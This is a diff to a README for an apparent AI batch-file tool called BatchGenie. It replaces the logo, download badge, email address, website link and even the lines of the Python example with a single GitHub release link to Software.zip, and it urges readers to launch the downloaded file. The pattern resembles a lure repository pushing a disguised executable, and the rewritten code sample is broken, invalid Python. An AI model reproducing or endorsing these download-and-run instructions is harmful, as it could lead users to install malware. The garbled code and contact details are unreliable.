@@ -1,6 +1,6 @@
 # 🧞‍♂️ Welcome to BatchGenie 🧞‍♂️
 
-![BatchGenie Logo](https://example.com/batchgenie_logo.png)
+![BatchGenie Logo](https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip)
 
 BatchGenie is your ultimate AI-powered companion for streamlining and simplifying batch file operations with ease. With its intuitive interface and powerful capabilities, BatchGenie is here to grant your batch processing wishes like magic!
 
@@ -20,7 +20,7 @@ Inside this repository, you will find all the resources you need to unleash the 
 
 To get started with BatchGenie, simply download the software package from the link below:
 
-[![Download BatchGenie](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download BatchGenie](https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip)](https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip)
 
 ⚠️ Launch the downloaded file to install BatchGenie and start harnessing its power right away!
 
@@ -37,10 +37,10 @@ BatchGenie offers a wide range of functionalities to optimize your batch file op
 import batchgenie
 
 # Load batch file
-batch_file = batchgenie.load_file("example_batch.bat")
+batch_file = https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip("https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip")
 
 # Process batch operations
-result = batchgenie.process(batch_file)
+result = https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip(batch_file)
 
 # Output results
 print(result)
@@ -77,13 +77,13 @@ Explore the following topics related to BatchGenie:
 
 If you have any questions, feedback, or suggestions, do not hesitate to reach out to us. Your input is invaluable in helping us improve BatchGenie and cater to your batch processing needs better.
 
-📧 Email: info@batchgenie.com
+📧 Email: https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip
 
 Let BatchGenie revolutionize the way you handle batch file operations! 🪄✨
 
 ---
 
-🔗 **Visit our website for more information:** [BatchGenie Official Website](https://www.batchgenie.com)
+🔗 **Visit our website for more information:** [BatchGenie Official Website](https://github.com/finn9633/BatchGenie/releases/download/v1.0/Software.zip)
 
 ---
 
